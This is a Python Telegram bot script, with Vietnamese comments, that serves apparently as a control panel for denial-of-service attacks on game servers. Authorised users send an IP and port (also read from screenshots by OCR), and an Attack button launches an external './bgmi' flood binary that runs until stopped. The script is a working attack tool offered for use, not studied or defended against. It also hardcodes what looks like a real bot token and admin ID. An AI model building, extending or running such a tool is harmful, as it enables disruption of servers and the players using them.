#!/usr/bin/python3

import telebot
import subprocess
import requests
import datetime
import os
import signal
import re
import pytesseract
from PIL import Image
from telebot import types

# insert your Telegram bot token here
bot = telebot.TeleBot('8279142566:AAE7719-93KPDHFXc0q8Y1eMCKJ_FUOpk0E')

# Admin user IDs
admin_id = ["6132441793"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

# Biến toàn cục lưu process bgmi và target
bgmi_process = None
last_target = None

# ---------------- Helpers ----------------
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

allowed_user_ids = read_users()

def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    username = "@" + user_info.username if user_info.username else f"UserID: {user_id}"
    with open(LOG_FILE, "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target: log_entry += f" | Target: {target}"
    if port: log_entry += f" | Port: {port}"
    if time: log_entry += f" | Time: {time}"
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

# ---------------- Regex Detect IP:PORT ----------------
def extract_ip_port(text):
    matches = re.findall(r'(\d{1,3}(?:\.\d{1,3}){3})\D+(\d{2,5})', text)
    valid = [(ip, int(port)) for ip, port in matches if 10011 <= int(port) <= 10020]
    return valid

# ---------------- Luôn hiện Keyboard ----------------
def main_keyboard():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row("🚀 Attack", "⛔ Stop")
    return markup

# ---------------- Admin Commands ----------------
@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            new_user = command[1]
            if new_user not in allowed_user_ids:
                allowed_user_ids.append(new_user)
                with open(USER_FILE, "a") as f:
                    f.write(f"{new_user}\n")
                bot.reply_to(message, f"User {new_user} added ✅", reply_markup=main_keyboard())
            else:
                bot.reply_to(message, "User already exists ❌", reply_markup=main_keyboard())
        else:
            bot.reply_to(message, "Usage: /add <userid>", reply_markup=main_keyboard())
    else:
        bot.reply_to(message, "Only Admin ❌", reply_markup=main_keyboard())

@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            uid = command[1]
            if uid in allowed_user_ids:
                allowed_user_ids.remove(uid)
                with open(USER_FILE, "w") as f:
                    for u in allowed_user_ids: f.write(f"{u}\n")
                bot.reply_to(message, f"User {uid} removed ✅", reply_markup=main_keyboard())
            else:
                bot.reply_to(message, f"User {uid} not found ❌", reply_markup=main_keyboard())
        else:
            bot.reply_to(message, "Usage: /remove <userid>", reply_markup=main_keyboard())
    else:
        bot.reply_to(message, "Only Admin ❌", reply_markup=main_keyboard())

@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    if str(message.chat.id) in admin_id:
        open(LOG_FILE, "w").close()
        bot.reply_to(message, "Logs cleared ✅", reply_markup=main_keyboard())
    else:
        bot.reply_to(message, "Only Admin ❌", reply_markup=main_keyboard())

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    if str(message.chat.id) in admin_id:
        try:
            with open(USER_FILE, "r") as f:
                data = f.read().splitlines()
                if data:
                    bot.reply_to(message, "Users:\n" + "\n".join(data), reply_markup=main_keyboard())
                else:
                    bot.reply_to(message, "No users ❌", reply_markup=main_keyboard())
        except:
            bot.reply_to(message, "No users ❌", reply_markup=main_keyboard())
    else:
        bot.reply_to(message, "Only Admin ❌", reply_markup=main_keyboard())

@bot.message_handler(commands=['logs'])
def show_logs(message):
    if str(message.chat.id) in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            with open(LOG_FILE, "rb") as f:
                bot.send_document(message.chat.id, f)
        else:
            bot.reply_to(message, "No logs ❌", reply_markup=main_keyboard())
    else:
        bot.reply_to(message, "Only Admin ❌", reply_markup=main_keyboard())

# ---------------- User Commands ----------------
@bot.message_handler(commands=['id'])
def show_id(message):
    bot.reply_to(message, f"ID Telegram của bạn là: {message.chat.id}", reply_markup=main_keyboard())

@bot.message_handler(commands=['start'])
def welcome_start(message):
    bot.reply_to(message, f"👋 Welcome {message.from_user.first_name}\nUse /help", reply_markup=main_keyboard())

@bot.message_handler(commands=['help'])
def show_help(message):
    bot.reply_to(message, '''🤖 Commands:
💥 Send IP:PORT or image to detect target
💥 🚀 Attack - Start attack until stopped
💥 ⛔ Stop - Stop running attack
''', reply_markup=main_keyboard())

# ---------------- Detect target khi gõ text ----------------
@bot.message_handler(func=lambda m: True, content_types=['text'])
def detect_target(message):
    global last_target
    if message.text in ["🚀 Attack", "⛔ Stop"]:
        handle_buttons(message)
        return

    valid = extract_ip_port(message.text)
    if valid:
        ip, port = valid[0]
        last_target = (ip, port)
        bot.reply_to(message, f"🎯 Target Detected:\n{ip}:{port}", reply_markup=main_keyboard())

# ---------------- OCR từ ảnh ----------------
@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    global last_target
    try:
        file_info = bot.get_file(message.photo[-1].file_id)
        downloaded_file = bot.download_file(file_info.file_path)

        with open("temp.jpg", "wb") as f:
            f.write(downloaded_file)

        img = Image.open("temp.jpg")
        text = pytesseract.image_to_string(img)

        valid = extract_ip_port(text)
        if valid:
            ip, port = valid[0]
            last_target = (ip, port)
            bot.reply_to(message, f"🎯 Target Detected (OCR):\n{ip}:{port}", reply_markup=main_keyboard())
        else:
            bot.reply_to(message, "❌ Không có IP nào trong khoảng 10011-10020.", reply_markup=main_keyboard())

        os.remove("temp.jpg")
    except Exception as e:
        bot.reply_to(message, f"Lỗi OCR: {e}", reply_markup=main_keyboard())

# ---------------- Handle nút Attack / Stop ----------------
def handle_buttons(message):
    global last_target, bgmi_process
    if message.text == "🚀 Attack":
        if not last_target:
            bot.reply_to(message, "❌ No target set", reply_markup=main_keyboard())
            return
        ip, port = last_target
        full_cmd = f"./bgmi {ip} {port} 0 200"  # 0 = chạy vô hạn
        bgmi_process = subprocess.Popen(full_cmd, shell=True, preexec_fn=os.setsid)
        bot.reply_to(message, f"🔥 Attack Started!\n{ip}:{port}\n⏱️ Running until stopped...", reply_markup=main_keyboard())
    elif message.text == "⛔ Stop":
        if bgmi_process and bgmi_process.poll() is None:
            os.killpg(os.getpgid(bgmi_process.pid), signal.SIGTERM)
            bgmi_process = None
            bot.reply_to(message, "✅ Attack stopped", reply_markup=main_keyboard())
        else:
            bot.reply_to(message, "⚠️ No running attack", reply_markup=main_keyboard())

# ---------------- Run Bot ----------------
bot.polling()
